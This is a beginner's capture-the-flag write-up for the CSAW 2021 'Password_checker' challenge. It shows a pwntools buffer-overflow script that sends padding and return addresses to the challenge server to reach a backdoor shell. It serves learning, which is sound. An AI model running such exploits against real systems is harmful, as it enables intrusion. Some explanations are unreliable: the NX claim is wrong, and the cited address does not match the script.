+++
title = "CSAW: Password_checker"
date = "2021-09-10"
aliases = ["Password_checker"]
[ author ]
  name = "Lucas Sass Rósinberg"
+++

# Password_Checker:

## Intro:

Charlie forgot his password to login into his Office portal. Help him to find it. (This challenge was written for the person on your team who has never solved a binary exploitation challenge before! Welcome to pwning.)

Netcat:nc pwn.chal.csaw.io 5000

File: password_checker

## Go through

The first hint you get is that this is for someone who hasn't solved a binary exploit before therefore we know a good place too look is at the file which we recieved. You can therefore start by using a tool to check the file for information about it I used GDB

So, in terminal run:`gdb password_checker`

Here you get the info

```
adding symbols from password_checker...
I'm sorry, Dave, I can't do that.  Symbol format ´elf64-x86-64´ unknown.
```

So from this we learn that the file is of the elf64-x86-64 format. elf is Executable and Linkable Format 64 bit

Now that we now it is a executable we can try using the tool checksec, when we run checksec on the binary:

`checksec --file=password_checker`

Then we get the information that there is no canary found, nx is enabled, no PIE, no RPATH

So here we learn that nx is enabled the NX bit (no-execute) is a technology used in CPUs to segregate areas of memory for use by either storage of processor instructions (code) or for storage of data.

This means we can try and do bufferoverflow meaning we will try to put more data into a fixed-lenght buffer than the buffer can handle and thereby be able to do code execution by shellcode injection.

So I used a reverse engineering tool called Cutter to decompile the binary file to get some information we are gonna use in the buffer overflow.

Here I find a backdoor which looks like this:

```c
void backdoor(void)
{
    system("/bin/sh");
    return;
}
```

We can then use cutter to get the instruction address which in this case is 0x0040117d, we can then use pwn tools to process our binary file and send our specific line which we specify to overflow. Then we can specify the address for the information which we want usinger pointers in order to be able to connect via netcat.

once we have perfected the bufferoverflow we can try and edit our script to execute the remote on the netcat server which is listening for the password.

Then if everything was done correctly you can type whoami and then you will be able to see nobody which tells you who you are you can then try typing ls to see what are in the directory, and there you will find the flag.txt, you can then cat the txt file to get the flag.

### Python Script used:

```python
#pip install pwn
from pwn import *
p = process("./password_checker")
#doesn't need to run remote before we have perfected the bufferoverflow
p = remote('pwn.chal.csaw.io',5000)
p.sendline (b'\x00'*72+b'\x84\x11\x40\x00\x00\x00\x00\x00\x72\x11\x40\x00\x00\x00\x00\x00')
p.interactive()
```

# Tools used

#### GDB

Gnu project debugger https://www.gnu.org/software/gdb/

#### Checksec

checksec is a bash script to check the properties of executables (like PIE, RELRO, PaX, Canaries, ASLR, Fortify Source) https://github.com/slimm609/checksec.sh

#### cutter

http://cutter.re is a free open source RE platform, used to convert assembly into something that looks like C

pwn is a gdb wrapper https://github.com/Gallopsled/pwntools
